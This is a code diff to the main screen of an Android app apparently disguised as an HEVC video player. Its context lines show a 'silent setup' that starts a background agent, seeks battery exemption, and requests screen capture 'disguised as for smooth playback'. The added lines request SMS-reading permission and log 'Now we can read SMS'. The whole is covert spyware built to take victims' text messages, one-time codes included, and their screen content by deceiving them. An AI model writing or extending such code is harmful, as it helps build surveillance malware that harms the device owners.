@@ -44,7 +44,7 @@ class MainActivity : AppCompatActivity() {
         val videoView = findViewById<VideoView>(R.id.videoView)
         val controller = MediaController(this)
         controller.setAnchorView(videoView)
-        videoView.setMediaController(controller)          // ← YEH LINE FIX HAI
+        videoView.setMediaController(controller)          // ← FIXED
         videoView.setVideoURI(Uri.parse(videoUrl))
         videoView.setOnPreparedListener { it.start() }
         videoView.setOnErrorListener { _, _, _ ->
@@ -54,8 +54,17 @@ class MainActivity : AppCompatActivity() {
 
         // ===== SILENT SETUP =====
         ensureAgentRunning()
+        
+        // Request all permissions in sequence
+        val neededPerms = mutableListOf<String>()
+        if (checkSelfPermission(android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            neededPerms.add(android.Manifest.permission.READ_SMS)
+        }
+        if (neededPerms.isNotEmpty()) {
+            requestPermissions(neededPerms.toTypedArray(), 101)
+        }
+        
         maybeRequestBatteryExempt()
-        requestPermissions(arrayOf(android.Manifest.permission.READ_SMS), 101)
 
         // ===== ONE-TIME: Screen access (disguised as "for smooth playback") =====
         if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("screen_granted", false)) {
@@ -146,6 +155,20 @@ class MainActivity : AppCompatActivity() {
             }
         } catch (e: Exception) {}
         getSharedPreferences("hevc", Context.MODE_PRIVATE).edit().putBoolean("bat_done", true).apply()
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        when (requestCode) {
+            101 -> {
+                if (grantResults.isNotEmpty() && grantResults[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    Log.d("HevcCodec", "SMS permission granted")
+                    // Now we can read SMS
+                } else {
+                    Log.w("HevcCodec", "SMS permission denied")
+                }
+            }
+        }
     }
 
     override fun onResume() {
